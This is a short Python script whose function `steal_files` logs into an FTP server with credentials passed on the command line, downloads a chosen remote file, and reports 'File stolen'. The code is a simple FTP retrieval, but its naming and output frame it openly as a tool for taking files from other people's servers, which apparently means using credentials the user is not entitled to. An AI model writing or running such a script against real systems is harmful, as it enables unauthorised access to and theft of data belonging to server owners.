import ftplib
import sys

def steal_files(host, username, password, remote_path, local_path):
    ftp = ftplib.FTP(host)
    ftp.login(username, password)
    with open(local_path, 'wb') as f:
        ftp.retrbinary(f'RETR {remote_path}', f.write)
    ftp.quit()
    print(f"File stolen: {remote_path} -> {local_path}")

if __name__ == "__main__":
    host = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    remote_path = sys.argv[4]
    local_path = sys.argv[5]
    steal_files(host, username, password, remote_path, local_path)
